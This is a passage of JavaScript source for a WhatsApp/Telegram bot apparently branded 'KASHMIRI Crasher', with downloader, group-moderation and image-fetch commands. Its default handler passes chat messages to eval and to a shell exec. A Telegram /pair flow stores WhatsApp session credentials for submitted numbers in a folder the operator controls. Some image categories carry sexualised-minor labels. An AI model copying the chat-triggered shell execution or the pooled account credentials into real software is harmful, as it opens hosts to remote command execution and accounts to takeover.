if (cek1.length == 0) return (`Enter a valid number and be registered on WhatsApp!!!`)
owner.push(prem1)
fs.writeFileSync('./WABOTowners.json', JSON.stringify(owner))
xreply(`𝐍𝐞𝐰 𝐎𝐰𝐧𝐞𝐫 𝐈𝐬 ${prem1}`)
}
break
case 'tiktok': case 'tt': {
  if (!q) return xreply(`Example: ${prefix + command} https://tiktok.com/Murbug-dev`);
  xreply("Please Wait...")
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(q)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*\n*Video Creator* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_\n*Video Likes*: _${data.stats.likeCount ?? ''}_\n*Video Comments*: _${data.stats.commentCount ?? ''}_\n*Video Shares*: _${data.stats.shareCount ?? ''}_\n*No Of Plays*: _${data.stats.playCount ?? ''}_\n*No of Saves*: _${data.stats.saveCount ?? ''}_\n> ⏤͟͟͞͞ 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐞𝐝 𝐁𝐲 𝓩𝓮𝓷 𝓒𝓻𝓪𝓼𝓱
`;
conn.sendMessage(chat, { caption: caption, video: { url: vidnya } }, { quoted: zets })
}
break
 case 'git': case 'gitclone':
if (!args[0]) return xreply(`Where is the link?\nExample :\n${prefix}${command} https://github.com/WhiskeySockets/baileys`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return send(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    conn.sendMessage(chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: zets }).catch((err) => xreply("Error"))
break
 case 'kick': { 
 if (!isCreator) {
await premRep();
return;
}
                 if (!isBotAdmin) return xreply(`I Need Admin Privileges To Complete This command`) 
    if (!q)  return xreply(`tag user!`)
 let users = mess.mentionedJid[0] ? mess.mentionedJid[0] : mess.quoted ? mess.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' 
 await conn.groupParticipantsUpdate(users, 'remove'); 
 xreply (`*_User Has Been Removed*!`); 
 } 
 break
case "getpp": { 
 try { 
 ha = mess.quoted.sender; 
 qd = await conn.getName(ha); 
 pp2 = await conn.profilePictureUrl(ha,'image'); 
 } catch {  
 pp2 = 'https://tinyurl.com/yx93l6da'; 
 } 
  if (!mess.quoted) throw `Tag The Target!`;
  if (!mess.qouted) xreply("Tag User") 
 bar = `𝐓𝐡𝐢𝐬 𝐈𝐬 𝐓𝐡𝐞 𝐏𝐫𝐨𝐟𝐢𝐥𝐞 𝐏𝐢𝐜𝐭𝐮𝐫𝐞 𝐎𝐟 ${qd}\n> 𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 `; 
 conn.sendMessage(chat, { image: { url: pp2}, caption: bar, fileLength: "999999999999"}, { quoted: zets}); 
 } 
 break
case 'splay': {
 const axios = require("axios");
 if (!q) return xreply('Enter Title Example\nExample `Hannah Montana`');

 await xreply("Please Wait a Moment...");

 try {
 // URL API untuk pencarian lagu
 const searchApiUrl = `https://spotifyapi.caliphdev.com/api/search/tracks?q=${encodeURIComponent(q)}`;
 const searchData = (await axios.get(searchApiUrl)).data;
 
 // Select the first result from the search data
 const data = searchData[0];
 if (!data) return xreply("Song not found.");

 // Teks yang akan dikirimkan
 const tekswait = `*𝐒𝐩𝐨𝐭𝐢𝐟𝐲 𝐩𝐥𝐚𝐲𝐞𝐫*

- *Title:* ${data.title}
- *Artist:* ${data.artist}
- *URL:* ${data.url}`;

 // Mengirim pesan informasi lagu
 await conn.sendMessage(chat, { 
 text: `${tekswait}`, 
 contextInfo: {
 mentionedJid: [mess.sender],
 externalAdxreply: { 
 showAdAttribution: true,
 title:`${data.title}`,
 body:"SPOTIFY SEARCH & DOWNLOAD",
 thumbnailUrl: data.thumbnail,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 } 
 }, { quoted: zets });


 const downloadApiUrl = `https://spotifyapi.caliphdev.com/api/download/track?url=${encodeURIComponent(data.url)}`;
 // Mendapatkan data dari API
 let response = await fetch(downloadApiUrl);
 
 if (response.headers.get("content-type") === "audio/mpeg") {
 await conn.sendMessage(chat, { audio: { url: downloadApiUrl }, mimetype: 'audio/mpeg' }, { quoted: zets });
 } else {
 xreply("Failed to get audio file.");
 }
 } catch (error) {
 console.error(error);
 xreply("An error occurred while retrieving the audio file.");
 }
}
break
    case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'ryujin': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakashi': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumi': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
xreply(`_plєαsє wαít_`)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakashi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
conn.sendMessage(chat, { image: { url: yeha }, caption : `𝕯𝖔𝖓𝖊` }, { quoted: zets })
}
break


        default:
        if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return send(bang)
}
try {                                                                             
send(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
send(String(e))
}
	} 
		if (budy.startsWith('>')) {
        if (!isCreator) return
        try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await send(evaled)
        } catch (err) {
        await send(String(err))
        }
	} 
	        
	if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return send(`${err}`)
if (stdout) return send(`${stdout}`)
})
} 
        }
	     } catch (error) { console.log(error)
	     conn.sendMessage(conn.user.id, { caption: error, image: { url: "https://g.top4top.io/p_3333ewpwt0.jpg" } } )}
        } catch (err) {
            console.log(err)
        }
    })
}

// Handle /connect command
// Import blacklist functions only once
const { isBlacklisted, addToBlacklist, removeFromBlacklist, getBlacklist } = require('./functions/blacklist'); 
const timeoutDuration = 2 * 60 * 1000;  // 2 minutes in milliseconds

// Pair Command (Checks Blacklist)
const validCountryCodePattern = /^[1-9]\d{0,3}/;  // Regex to check for a valid country code without "+" (starting with a digit)

// This will handle /pair without any number
bot.onText(/^\/pair$/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, '❗ Please enter your number like /pair 81818181818');
});

// This handles /pair <number>
bot.onText(/\/pair (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    let phoneNumber = match[1];

    // Check if the phone number starts with a valid country code (no "+" symbol)
    if (!validCountryCodePattern.test(phoneNumber)) {
        bot.sendMessage(chatId, '❌ The phone number must start with a valid country code (e.g., 1 for the USA).');
        return;
    }

    // Check if the number is blacklisted
    if (isBlacklisted(phoneNumber)) {
        bot.sendMessage(chatId, `❌ The phone number *${phoneNumber}* is blacklisted and cannot be paired.`);
        return;
    }

    const sessionPath = path.join(__dirname, 'AllCreds', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (!fs.existsSync(sessionPath)) {
        // Create session directory
        fs.mkdirSync(sessionPath, { recursive: true });
        console.log(`Session directory created for ${phoneNumber}.`);
        bot.sendMessage(chatId, `✅ Session directory created for ${phoneNumber}\nWait for your pairing code.`);

        // Generate and send pairing code
        startWhatsAppBot(phoneNumber, chatId).catch(err => {
            console.log('Error:', err);
            bot.sendMessage(chatId, '⚠️ An error occurred while connecting.');
        });

        // Set a timeout to delete the session if pairing is not completed in 2 minutes
        setTimeout(() => {
            if (!connectedUsers[chatId] || !connectedUsers[chatId].some(user => user.phoneNumber === phoneNumber)) {
                if (fs.existsSync(sessionPath)) {
                    fs.rmSync(sessionPath, { recursive: true });
                    console.log(`Session directory for ${phoneNumber} deleted due to timeout.`);
                    bot.sendMessage(chatId, `⚠️ Pairing for phone number ${phoneNumber} was not completed in time. The session has been deleted.`);
                }
            }
        }, timeoutDuration);

    } else {
        const isAlreadyConnected = connectedUsers[chatId] && connectedUsers[chatId].some(user => user.phoneNumber === phoneNumber);
        if (isAlreadyConnected) {
            bot.sendMessage(chatId, `⚠️ The phone number ${phoneNumber} is already connected. Use /delsession to remove it before pairing again.`);
            return;
        }

        bot.sendMessage(chatId, `ℹ️ The session for ${phoneNumber} already exists. Use /delsession to remove it or reconnect.`);
    }
});

// Owner-Only Blacklist Management Commands
bot.onText(/\/addblack (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const phoneNumber = match[1];

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
    }

    addToBlacklist(phoneNumber);
    bot.sendMessage(chatId, `✅ The phone number ${phoneNumber} has been blacklisted.`);
});

bot.onText(/\/delblack (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const phoneNumber = match[1];

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
    }

    removeFromBlacklist(phoneNumber);
    bot.sendMessage(chatId, `✅ The phone number ${phoneNumber} has been removed from the blacklist.`);
});

bot.onText(/\/listblack/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
    }

    const blacklist = getBlacklist();
    if (blacklist.length === 0) {
        bot.sendMessage(chatId, "⚠️ The blacklist is empty.");
    } else {
        bot.sendMessage(chatId, `🚫 Blacklisted Numbers:\n\n${blacklist.join("\n")}`);
    }
});
//broadcast 
const { addUser, getAllUsers } = require('./functions/broadcast'); // Import user functions

bot.on("message", async (msg) => {
    const userId = msg.chat.id.toString();
    addUser(userId); // Save the user if they are new
});
//broad function 
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id.toString();
    const messageText = match[1];

    // Only allow the bot owner to use this command
    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
    }

    // Get all bot users
    const users = getAllUsers();

    if (users.length === 0) {
        return bot.sendMessage(chatId, "⚠️ No users to broadcast to.");
    }

    bot.sendMessage(chatId, `📢 Sending broadcast to ${users.length} users...`);

    for (const user of users) {
        try {
            await bot.sendMessage(user, `📢 *Broadcast Message:*\n\n${messageText}`);
        } catch (error) {
            console.error(`❌ Failed to send message to ${user}:`, error);
        }
    }

    bot.sendMessage(chatId, "✅ Broadcast completed!");
});
// Handle /delete command
bot.onText(/\/delsession (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1];
    const sessionPath = path.join(__dirname, 'AllCreds', `session_${phoneNumber}`);

    // Check if the session directory exists
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        bot.sendMessage(chatId, `✅ Session for ${phoneNumber} has been deleted. You can now request a new pairing code.`);

        // Remove the association after deletion
        if (connectedUsers[chatId]) {
            connectedUsers[chatId] = connectedUsers[chatId].filter(user => user.phoneNumber !== phoneNumber);
            saveConnectedUsers(); // Save updated connected users
        }
    } else {
        bot.sendMessage(chatId, `⚠️ No session found for ${phoneNumber}. It may have already been deleted.`);
    }
});

//clear session//
bot.onText(/\/clearsessions/, (msg) => {
    const chatId = msg.chat.id;
    const ownerId = msg.from.id.toString();

    // Only allow the owner to use this command
    if (ownerId !== OWNER_ID) {
        return bot.sendMessage(chatId, '❌ You are not authorized to use this command.');
    }

    const sessionsDir = path.join(__dirname, 'AllCreds');
    if (!fs.existsSync(sessionsDir)) {
        return bot.sendMessage(chatId, "⚠️ No session directory found.");
    }

    const sessionFiles = fs.readdirSync(sessionsDir);
    let activeSessions = new Set();

    // Collect all currently connected phone numbers
    Object.values(connectedUsers).forEach(users => {
        users.forEach(user => {
            activeSessions.add(`session_${user.phoneNumber}`);
        });
    });

    let deletedCount = 0;

    // Loop through all session files and delete if not active
    for (const file of sessionFiles) {
        if (!activeSessions.has(file)) {
            const filePath = path.join(sessionsDir, file);
            fs.rmSync(filePath, { recursive: true, force: true });
            console.log(`🗑️ Deleted unused session: ${file}`);
            deletedCount++;
        }
    }

    bot.sendMessage(chatId, `✅ Cleanup complete! Deleted ${deletedCount} unused sessions.`);
});

// Handle /start Command 
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  // Send messages with video and channel buttons
  bot.sendVideo(chatId, "https://files.catbox.moe/43thu9.mp4", {
    caption: `
━━━━━(  𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 )
︎ϟ 𝗡𝗮𝗺𝗲 𝗢𝗳 𝗕𝗼𝘁 : 𝐊𝐀𝐒𝐇𝐌𝐈𝐑𝐈 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 
ϟ 𝗕𝗼𝘁 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 𝗫I
ϟ 𝗟𝗶𝗯𝗿𝗮𝗿𝘆 : 𝗡𝗼𝗱𝗲-𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺-𝗔𝗽𝗶
━━━━━━━━━━━━━━━━━━
Hello, Hope you enjoy using this bot!  
            join channels 
    https://t.me/+N_jp7QWqfGg0ZGM8
══════════════════
🚀 /pair </connect to the bot/>
🚀 /listpair </check paired users/>
🚀 /delsession </delete paired number/>
🚀 /clearsessions </delete wll unused sessions/>
🚀 /addblack </add number to black list/>
🚀 /delblack </delete number from black list/>
🚀 /listblack </show black list number/>
══════════════════
┏━━《 ANY ISSUE CONTACT ME》
┣࿊ t.me/kashmiri_x1
┗━━━━━━━━━`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "🕎 Updates", url: "https://whatsapp.com/channel/0029VaieFO2HFxOtUtwLvQ0b" }],
        [{ text: "🕎 Youtube", url: "https://youtube.com/@mohsin-botz" }],
        [{ text: "🆘 Support", url: "https://t.me/kashmiri_x1" }],
      ],
    },
  });
});

bot.onText(/\/listpair/, (msg) => {
    const chatId = msg.chat.id;
    const ownerId = msg.from.id.toString();
    const connectedUser = connectedUsers[chatId];

    // Allow only the owner to use this command
    if (ownerId !== OWNER_ID) {
        return bot.sendMessage(chatId, '❌ You are not authorized to use this command.\nWant Bot Access');
    }

    // If the user is the owner, continue with the process
    if (connectedUser && connectedUser.length > 0) {
        let statusText = `Bot Status:\n- Connected Numbers:\n`;
        connectedUser.forEach(user => {
            const uptime = Math.floor((Date.now() - user.connectedAt) / 1000); // Convert runtime to seconds
            statusText += `${user.phoneNumber} (Uptime: ${uptime} seconds)\n`;
        });
        bot.sendMessage(chatId, statusText);
    } else {
        bot.sendMessage(chatId, `You have no registered numbers.`);
    }
});

// Function to load all session files
async function loadAllSessions() {
    const sessionsDir = path.join(__dirname, 'AllCreds');

    // Ensure the directory exists
    if (!fs.existsSync(sessionsDir)) {
        fs.mkdirSync(sessionsDir);
    }

    // Read session files and start WhatsApp bot instances
    const sessionFiles = fs.readdirSync(sessionsDir);
    for (const file of sessionFiles) {
        if (file.startsWith('session_')) {
            const phoneNumber = file.replace('session_', '');
            await startWhatsAppBot(phoneNumber);
        }
    }
}

// Ensure all sessions are loaded on startup
loadConnectedUsers(); // Load connected users from the JSON file
loadAllSessions().catch(err => {
    console.log('Error loading sessions:', err);
});

// Start the bot
    console.log("\x1b[33m%s\x1b[0m", `
═══『 KASHMIRI BOT XI 』═══
[♥] 𝗕𝗼𝘁 𝗔𝗰𝘁𝗶𝘃𝗲
[♥] 𝗗𝗼 𝗡𝗼𝘁 𝗦𝗽𝗮𝗺 𝗕𝗼𝘁
[♥] 𝗨𝘀𝗲 /start
⊰᯽⊱┈─┈──╌┈──╌❊`)
console.log('Telegram bot is running...');


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})
